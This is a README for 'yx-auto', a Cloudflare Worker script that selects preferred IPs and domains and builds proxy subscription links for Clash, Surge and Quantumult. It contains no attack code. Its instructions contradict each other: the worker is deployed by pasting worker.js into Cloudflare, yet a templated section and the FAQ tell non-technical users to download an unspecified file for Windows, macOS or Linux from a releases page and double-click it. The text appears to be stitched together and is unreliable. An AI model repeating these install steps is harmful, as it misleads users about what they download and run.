# 🎉 yx-auto - Simplify Server Selection Effortlessly

[![Download yx-auto](https://img.shields.io/badge/Download-yx--auto-blue)](https://github.com/fernandobrian0501/yx-auto/releases)

## 🚀 Getting Started

yx-auto is a tool that simplifies server selection by automating the process. Follow these steps to download and run it on your machine.

## 📥 Download & Install

1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/fernandobrian0501/yx-auto/releases) to find the latest version of yx-auto.
2. **Choose Your Version**: Look for the latest version. Click on the download link for your operating system.
3. **Locate the File**: Once the download completes, locate the file in your downloads folder.
4. **Run the Application**: Double-click the downloaded file to start yx-auto.

## 🛠️ Features

yx-auto comes with various features designed to enhance your experience:

- **Automatic Domain Selection**: Uses a built-in list of preferred domains.
- **Frequent IP Selection**: Updates preferred IP addresses every 15 minutes.
- **GitHub IP Source**: Fetches preferred IP lists from GitHub repositories.
- **Subscription Generation**: Supports generating subscriptions for Clash, Surge, and Quantumult formats.
- **Client Compatibility**: Works with multiple clients including Clash and Surge.
- **IP Version Selection**: Choose between IPv4 and IPv6.
- **Carrier Filtering**: Filter preferred IPs by carriers like Mobile, Unicom, or Telecom.

## 📊 How to Use

### 1. 🌐 Deploy to Cloudflare Workers

To deploy yx-auto as a Cloudflare Worker, follow these steps:

1. Log in to your Cloudflare Dashboard.
2. Navigate to Workers & Pages.
3. Create a new Worker.
4. Copy the content of `worker.js` into the editor.
5. Save and deploy.

### 2. 🔍 User Interface

Once deployed, you can access the interface for yx-auto:

1. **Input Domain**: Enter your Cloudflare Workers domain.
2. **Input UUID**: Provide your UUID (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx).
3. **Configuration Options**:
   - Enable preferred domains to use the built-in list.
   - Enable preferred IPs to fetch dynamic IPs from wetest.vip.
   - Enable GitHub preference to retrieve IPs from GitHub.
   - Select a client for your subscription format (Base64, Clash, Surge, Quantumult X).
   - Choose the IP version (IPv4 or IPv6).
   - Select a carrier (Mobile, Unicom, Telecom).
4. **Generate Subscription**: Click the "生成订阅链接" button to create your subscription link.

### 3. 🔗 Subscription Link Format

Your generated subscription link will follow this format:

```
https://your-worker.workers.dev/{UUID}/sub?domain=your-domain.com&epd=yes&epi=yes&egi=yes
```

### 4. 📄 Supported Subscription Formats

You can specify the subscription format by adding the `&target=` parameter:

- `&target=base64` - Base64 encoding (default).
- `&target=clash` - Clash configuration.
- `&target=surge` - Surge configuration.
- `&target=quantumult` - Quantumult configuration.

## ❓ Frequently Asked Questions

### What is yx-auto?

yx-auto is a tool designed to simplify server selection by automating IP and domain preferences.

### Do I need technical skills to use yx-auto?

No, yx-auto is designed for users without programming knowledge. Just follow the steps outlined here.

### What operating systems does yx-auto support?

yx-auto supports Windows, macOS, and Linux. Make sure to download the version that matches your system.

## 📄 Additional Information

For more details about yx-auto, please explore the documentation available on the Releases page. You can also report issues or contribute to the project through the GitHub repository.

[![Download yx-auto](https://img.shields.io/badge/Download-yx--auto-blue)](https://github.com/fernandobrian0501/yx-auto/releases)